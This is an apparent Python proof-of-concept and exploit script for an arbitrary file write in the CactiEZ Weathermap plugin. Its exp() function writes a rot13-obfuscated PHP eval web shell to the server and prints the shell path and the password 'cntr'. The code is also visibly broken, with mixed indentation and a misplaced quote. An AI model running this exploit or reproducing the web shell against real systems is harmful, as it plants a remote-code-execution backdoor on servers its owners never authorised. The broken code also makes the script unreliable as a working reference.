#!/usr/bin/env python
#-*- coding:utf-8 -*-
# author = S4kur4
_type = 'FW'
"""
CactiEZ weathermap plugin arbitary file write and getshell
"""

import requests
import random

def poc(url):
	try:
        if '://' not in url:
            url = 'http://' + url
        tmp = str(random.randint(1000,2000))
        poc_payload = """/plugins/weathermap/editor.php?plug=0&mapname=tmp.txt&action=set_ma
        p_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_na
        me=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&l
        ink_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link
        _hover=&map_title={}&map_legend=Traffi
        c+Load&map_stamp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7&map_linkdefaul
        tbwin=100M&map_linkdefaultbwout=100M&map_width=800&map_height=600&map_pngfile=&ma
        p_htmlfile=&map_bgfile=--NONE--&mapstyle_linklabels=percent&mapstyle_htmlstyle=ov
        erlib&mapstyle_arrowstyle=classic&mapstyle_nodefont=3&mapstyle_linkfont=2&mapstyl
        e_legendfont=4&item_configtext=Name""".format(tmp)
        poc_response = requests.get(url=url.rstrip('/')+poc_payload)
        verify_response = requests.get(url.rstrip('/')+'/plugins/weathermap/configs/tmp.txt')
        if poc_response.status_code==200 and verify_response.status_code==200:
			if tmp in verify_response.text:
				return True
		else:
			return False
    except Exception:
        return False

def exp(url):
	if '://' not in url:
            url = 'http://' + url
	exp_payload = """/plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_ma
        p_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_na
        me=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&l
        ink_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link
        _hover=&map_title=<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>&map_legend=Traffi
        c+Load&map_stamp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7&map_linkdefaul
        tbwin=100M&map_linkdefaultbwout=100M&map_width=800&map_height=600&map_pngfile=&ma
        p_htmlfile=&map_bgfile=--NONE--&mapstyle_linklabels=percent&mapstyle_htmlstyle=ov
        erlib&mapstyle_arrowstyle=classic&mapstyle_nodefont=3&mapstyle_linkfont=2&mapstyl
        e_legendfont=4&item_configtext=Name"""
    exp_response = requests.get(url=url.rstrip('/')+exp_payload)
    shell_response = requests.get(url.rstrip('/')+'/plugins/weathermap/configs/test.php)'
    if exp_response.status_code==200 and shell_response.status_code==200:
    	print "Getshell success:{}/plugins/weathermap/configs/test.php".format(url.rstrip('/'))
    	print "Password:cntr"
